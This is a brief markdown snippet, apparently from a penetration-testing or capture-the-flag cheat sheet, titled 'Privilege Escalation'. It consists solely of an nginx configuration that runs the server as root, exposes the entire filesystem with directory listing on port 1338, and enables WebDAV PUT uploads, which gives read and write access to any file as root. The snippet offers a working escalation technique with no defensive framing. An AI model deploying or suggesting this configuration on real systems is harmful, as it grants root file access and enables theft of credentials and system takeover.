## Privilege Escalation

```nginx
user root;
worker_processes 4;
pid /tmp/nginx.pid;
events {
        worker_connections 768;
}
http {
        server {
                listen 1338;
                root /;
                autoindex on;

                dav_methods PUT; # with dav_methods
        }
}
```
